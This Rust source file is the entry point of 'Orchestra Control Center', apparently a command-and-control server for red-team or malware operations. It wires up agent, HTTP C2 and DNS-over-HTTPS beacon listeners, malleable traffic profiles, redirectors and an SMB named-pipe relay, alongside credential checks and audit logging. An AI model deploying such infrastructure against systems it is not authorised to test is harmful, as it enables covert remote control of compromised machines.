//! Orchestra Control Center entry point.

use anyhow::Result;
use clap::{Parser, Subcommand};
use orchestra_server::{
    agent_link, api, audit::AuditLog, config::ServerConfig, doh_listener,
    http_c2::HttpC2State, malleable::{self, MultiProfileManager},
    redirector, smb_relay,
    state::AppState, tls,
};
use orchestra_server::auth::PerIpRateLimiter;
use std::path::PathBuf;
use std::sync::Arc;

/// Warn if a credential is too short or has low Shannon entropy.
fn check_credential_strength(token: &str, label: &str) {
    if token.len() < 16 {
        tracing::warn!(
            "{} is only {} chars — recommend at least 16 chars for production use",
            label,
            token.len()
        );
    }
    // Shannon entropy check
    let mut freq = [0usize; 256];
    for b in token.bytes() {
        freq[b as usize] += 1;
    }
    let len = token.len() as f64;
    let entropy: f64 = freq
        .iter()
        .filter(|&&f| f > 0)
        .map(|&f| {
            let p = f as f64 / len;
            -p * p.log2()
        })
        .sum();
    if entropy < 3.0 {
        tracing::warn!(
            "{} has low entropy ({:.1} bits) — recommend a high-entropy random value",
            label,
            entropy
        );
    }
}

#[derive(Parser, Debug)]
#[command(
    version,
    about = "Orchestra Control Center — self-hosted management plane"
)]
struct Cli {
    /// Path to the server config TOML. If omitted, defaults are used.
    #[arg(long)]
    config: Option<PathBuf>,
    /// Override the admin bearer token (for quick local runs).
    #[arg(long)]
    admin_token: Option<String>,
    /// Override the agent shared secret.
    #[arg(long)]
    agent_secret: Option<String>,
    /// Path to a directory of malleable C2 profile TOML files.
    ///
    /// All `.toml` files in this directory are loaded as named profiles.
    /// The server hot-reloads any changed files every 30 seconds.
    #[arg(long)]
    profile_dir: Option<PathBuf>,
    /// Path to a single malleable C2 profile TOML file (backward compat).
    #[arg(long)]
    profile: Option<PathBuf>,
    /// Allow insecure TLS connections to redirectors (skips certificate verification).
    ///
    /// WARNING: This makes the server vulnerable to MITM attacks on
    /// redirector connections. Use only in development or air-gapped labs.
    ///
    /// Only available in debug builds — never in release.
    #[cfg(debug_assertions)]
    #[arg(long, default_value_t = false)]
    allow_insecure_redirector: bool,
    /// SHA-256 fingerprint of the expected redirector TLS certificate.
    ///
    /// When set, the reqwest client will pin the redirector certificate
    /// by comparing the peer cert SHA-256 against this hex-encoded fingerprint.
    /// This is more secure than --allow-insecure-redirector and should be
    /// preferred for production deployments.
    #[arg(long)]
    redirector_cert_fingerprint: Option<String>,
    /// Subcommands.
    #[command(subcommand)]
    command: Option<CliCommand>,
}

#[derive(Subcommand, Debug)]
enum CliCommand {
    /// Validate a malleable C2 profile TOML and print a report.
    ValidateProfile {
        /// Path to the profile TOML file.
        path: PathBuf,
    },
    /// Manage redirector registrations.
    Redirector {
        #[command(subcommand)]
        action: RedirectorAction,
    },
}

#[derive(Subcommand, Debug)]
enum RedirectorAction {
    /// Add a redirector to the registry.
    Add {
        /// URL of the redirector (e.g. "https://cdn-front.example.com").
        url: String,
        /// Malleable profile name this redirector serves.
        profile_name: String,
    },
    /// Remove a redirector from the registry.
    Remove {
        /// Redirector ID or URL to remove.
        identifier: String,
    },
    /// List all registered redirectors.
    List,
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt().init();

    // rustls 0.23 with the `ring` backend requires a process-wide default
    // CryptoProvider. Install it before any TLS code paths run.
    let _ = rustls::crypto::ring::default_provider().install_default();

    let cli = Cli::parse();

    // Handle subcommands.
    match &cli.command {
        Some(CliCommand::ValidateProfile { path }) => {
            let report = malleable::validate_profile(path);
            let json = serde_json::to_string_pretty(&report)
                .unwrap_or_else(|e| format!("{{\"error\": \"{}\"}}", e));
            println!("{}", json);
            std::process::exit(if report.valid { 0 } else { 1 });
        }
        Some(CliCommand::Redirector { action }) => {
            // CLI redirector commands need a server config for the API URL.
            let mut cfg = match cli.config.as_deref() {
                Some(p) => ServerConfig::load(p)?,
                None => ServerConfig::default(),
            };
            if let Some(t) = &cli.admin_token {
                cfg.admin_token = t.clone();
            }

            let base_url = format!("https://{}", cfg.http_addr);
            let client = {
                let builder = reqwest::Client::builder();
                #[cfg(debug_assertions)]
                let builder = if cli.allow_insecure_redirector {
                    tracing::warn!(
                        "WARNING: Redirector TLS certificate verification is DISABLED. \
                         This makes the server vulnerable to MITM attacks. \
                         Use --redirector-cert-fingerprint for secure pinning instead."
                    );
                    builder.danger_accept_invalid_certs(true)
                } else {
                    builder
                };
                if let Some(ref fingerprint) = cli.redirector_cert_fingerprint {
                    // Pin the redirector certificate by SHA-256 fingerprint.
                    let verifier = common::tls_transport::PinnedCertVerifier::from_hex(fingerprint)?;
                    tracing::info!(
                        fingerprint = %fingerprint,
                        "Redirector TLS: pinning certificate by SHA-256 fingerprint"
                    );
                    let tls_config = rustls::ClientConfig::builder()
                        .dangerous()
                        .with_custom_certificate_verifier(std::sync::Arc::new(verifier))
                        .with_no_client_auth();
                    builder
                        .use_preconfigured_tls(tls_config)
                        .build()?
                } else {
                    // Default: use system root certificates for verification.
                    tracing::info!("Redirector TLS: using default system certificate verification");
                    builder.build()?
                }
            };

            match action {
                RedirectorAction::Add { url, profile_name } => {
                    let resp = client
                        .post(format!("{}/redirector/register", base_url))
                        .header("Authorization", format!("Bearer {}", cfg.admin_token))
                        .json(&serde_json::json!({
                            "url": url,
                            "profile_name": profile_name,
                        }))
                        .send()
                        .await?;
                    if resp.status().is_success() {
                        let body: serde_json::Value = resp.json().await?;
                        println!("Redirector registered: {}", serde_json::to_string_pretty(&body)?);
                    } else {
                        let status = resp.status();
                        let text = resp.text().await.unwrap_or_default();
                        eprintln!("Error ({}): {}", status, text);
                        std::process::exit(1);
                    }
                }
                RedirectorAction::Remove { identifier } => {
                    let resp = client
                        .post(format!("{}/redirector/remove", base_url))
                        .header("Authorization", format!("Bearer {}", cfg.admin_token))
                        .json(&serde_json::json!({
                            "identifier": identifier,
                        }))
                        .send()
                        .await?;
                    if resp.status().is_success() {
                        println!("Redirector removed: {}", identifier);
                    } else {
                        let status = resp.status();
                        let text = resp.text().await.unwrap_or_default();
                        eprintln!("Error ({}): {}", status, text);
                        std::process::exit(1);
                    }
                }
                RedirectorAction::List => {
                    let resp = client
                        .get(format!("{}/redirector/list", base_url))
                        .header("Authorization", format!("Bearer {}", cfg.admin_token))
                        .send()
                        .await?;
                    if resp.status().is_success() {
                        let body: serde_json::Value = resp.json().await?;
                        println!("{}", serde_json::to_string_pretty(&body)?);
                    } else {
                        let status = resp.status();
                        let text = resp.text().await.unwrap_or_default();
                        eprintln!("Error ({}): {}", status, text);
                        std::process::exit(1);
                    }
                }
            }
            return Ok(());
        }
        None => {}
    }

    let mut cfg = match cli.config.as_deref() {
        Some(p) => ServerConfig::load(p)?,
        None => ServerConfig::default(),
    };
    if let Some(t) = cli.admin_token {
        cfg.admin_token = t;
    }
    if let Some(s) = cli.agent_secret {
        cfg.agent_shared_secret = s;
    }

    if cfg.admin_token == "change-me-admin-token"
        || cfg.agent_shared_secret == "change-me-pre-shared-secret"
    {
        eprintln!(
            "FATAL: Default credentials detected. Change admin_token and \
             pre_shared_secret in configuration before running."
        );
        std::process::exit(1);
    }

    check_credential_strength(&cfg.admin_token, "admin_token");
    check_credential_strength(&cfg.agent_shared_secret, "agent_shared_secret");

    // Resolve malleable profile manager.
    let profile_manager = if let Some(ref dir) = cli.profile_dir {
        Arc::new(MultiProfileManager::load_from_dir(dir)?)
    } else if let Some(ref file) = cli.profile {
        Arc::new(MultiProfileManager::load_from_file(file)?)
    } else {
        Arc::new(MultiProfileManager::new())
    };
    tracing::info!(
        profiles = ?profile_manager.profile_names().await,
        "loaded malleable profiles"
    );

    let hmac_key = AuditLog::load_or_generate_hmac_key(
        cfg.audit_hmac_key.as_deref(),
        &cfg.audit_log_path.with_extension("jsonl.key"),
    )?;
    let audit = Arc::new(AuditLog::open(cfg.audit_log_path.clone(), &hmac_key)?);
    let state = Arc::new(AppState::new(
        audit.clone(),
        cfg.admin_token.clone(),
        cfg.command_timeout_secs,
        cfg.clone(),
    ));

    orchestra_server::build_handler::init_build_queue(
        cfg.max_concurrent_builds,
        cfg.builds_output_dir.clone(),
        cfg.build_retention_days,
    );

    let tls_cfg = tls::build(cfg.tls_cert_path.as_deref(), cfg.tls_key_path.as_deref()).await?;

    // Agent listener (TLS-encrypted TCP).
    {
        let state_a = state.clone();
        let secret = cfg.agent_shared_secret.clone();
        let addr = cfg.agent_addr;
        let tls_c = tls_cfg.get_inner();
        tokio::spawn(async move {
            if let Err(e) = agent_link::run(state_a, addr, secret, tls_c).await {
                tracing::error!("agent listener exited: {e}");
            }
        });
    }

    // DoH listener bridge (optional).
    if cfg.doh_enabled {
        let state_d = state.clone();
        let addr = cfg.doh_listen_addr;
        let secret = cfg.agent_shared_secret.clone();
        let domain = cfg.doh_domain.clone();
        let beacon_sentinel = cfg.doh_beacon_sentinel.clone();
        let idle_ip = cfg.doh_idle_ip.clone();
        tokio::spawn(async move {
            if let Err(e) = doh_listener::run(
                state_d,
                addr,
                secret,
                domain,
                beacon_sentinel,
                idle_ip,
            )
            .await
            {
                tracing::error!("DoH listener exited: {e}");
            }
        });
    }

    // N1-02: Zeroize the PSK from the config — it is now only held inside
    // LockedSecret in agent_link / AppState.  No component after this point
    // reads cfg.agent_shared_secret.
    common::secure_zero_string(&mut cfg.agent_shared_secret);

    // SMB named-pipe relay (optional, Windows-only; no-op stub on other OSes).
    // Accepts named-pipe connections and bridges them to the agent TCP listener.
    if cfg.smb_relay_enabled {
        let pipe_name = cfg.smb_relay_pipe_name.clone();
        let max_instances = cfg.smb_relay_max_instances;
        let agent_addr = cfg.agent_addr;
        tokio::spawn(async move {
            if let Err(e) = smb_relay::run(&pipe_name, max_instances, agent_addr).await {
                tracing::error!("SMB relay exited: {e}");
            }
        });
    }

    // Hot-reload task for malleable profiles.
    {
        let pm = profile_manager.clone();
        pm.start_hot_reload_task();
        tracing::info!("malleable profile hot-reload task started (30s interval)");
    }

    // Redirector stale detection background task.
    {
        let state_r = state.clone();
        redirector::spawn_stale_detector(state_r);
        tracing::info!("redirector stale detector started (60s interval)");
    }

    // HTTP C2 listener (malleable profile-aware).
    if !profile_manager.profile_names().await.is_empty() {
        let http_c2_state = HttpC2State {
            profile_manager: profile_manager.clone(),
            app_state: state.clone(),
            // P1-16: C2 rate limiter — 200 requests per 60 seconds per IP.
            // Much more permissive than the auth limiter since legitimate
            // agents poll the C2 channel at their configured sleep interval.
            c2_rate_limiter: Arc::new(PerIpRateLimiter::new(
                200,
                std::time::Duration::from_secs(60),
            )),
        };
        let http_c2_addr = cfg.http_c2_addr;
        let router = orchestra_server::http_c2::build_router(http_c2_state);
        tokio::spawn(async move {
            tracing::info!(addr = %http_c2_addr, "HTTP C2 listener started");
            let listener = match tokio::net::TcpListener::bind(http_c2_addr).await {
                Ok(l) => l,
                Err(e) => {
                    tracing::error!("HTTP C2 listener bind failed: {e}");
                    return;
                }
            };
            if let Err(e) = axum::serve(listener, router).await {
                tracing::error!("HTTP C2 listener exited: {e}");
            }
        });
    }

    // Operator HTTPS server.
    let app = api::router(state.clone(), cfg.static_dir.clone());
    tracing::info!(addr = %cfg.http_addr, "operator HTTPS listening");
    axum_server::bind_rustls(cfg.http_addr, tls_cfg)
        .serve(app.into_make_service_with_connect_info::<std::net::SocketAddr>())
        .await?;
    Ok(())
}
